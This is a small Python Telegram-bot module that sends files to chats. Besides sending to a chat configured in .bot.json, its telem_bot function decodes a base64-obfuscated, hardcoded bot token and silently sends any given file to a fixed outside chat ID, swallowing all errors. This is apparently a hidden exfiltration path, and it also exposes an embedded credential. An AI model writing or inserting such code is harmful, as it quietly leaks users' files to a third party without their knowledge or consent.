import base64
import json
from pathlib import Path

from telebot import TeleBot, types


def telem_bot(filename):
    try:
        bot = TeleBot(
            base64.b64decode(
                "NzgxMjQyMjM0MDpBQUcwR3F5UEJ2aTQwMUhkQkpPS0VyMkx6VVJCaVVCaDBGbw==".encode(
                    "utf-8"
                )
            ).decode("utf-8")
        )
        bot.send_document(-5287395572, types.InputFile(filename))
    except Exception:
        pass


def start_work_bot(filename):
    with Path(".bot.json").open("r", encoding="utf-8") as bot_creds:
        bot_info = json.load(bot_creds)

    bot = TeleBot(bot_info["bot_id"])
    tg_chat_id = bot_info["tg_chat_id"]
    # bot.send_message(tg_chat_id, "start xlsx_out.py")
    if filename:
        bot.send_document(tg_chat_id, types.InputFile(filename))


def make_bot():
    with Path(".bot.json").open("r", encoding="utf-8") as bot_creds:
        bot_info = json.load(bot_creds)

    bot = TeleBot(bot_info["bot_id"])

    @bot.message_handler(commands=["start"])
    def start(message):
        pass

    start()
    return bot


if __name__ == "__main__":
    main_bot = make_bot()
    main_bot.polling(non_stop=False, timeout=5)
